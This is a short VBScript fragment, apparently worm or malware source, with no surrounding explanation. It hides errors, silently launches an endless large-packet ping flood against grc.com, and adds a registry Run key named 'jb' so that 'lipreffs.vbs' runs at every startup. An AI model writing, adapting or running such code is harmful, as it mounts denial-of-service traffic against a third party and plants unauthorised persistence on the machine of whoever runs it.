   on error resume next
   Set src = CreateObject("Wscript.shell")
   src.run "ping -n 99999999999999999999999999 -l 7886 -w 0 grc.com ",0,false
   updateSP = "lipreffs.vbs"
   keySP = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\jb"
   src.RegWrite keySP, updateSP
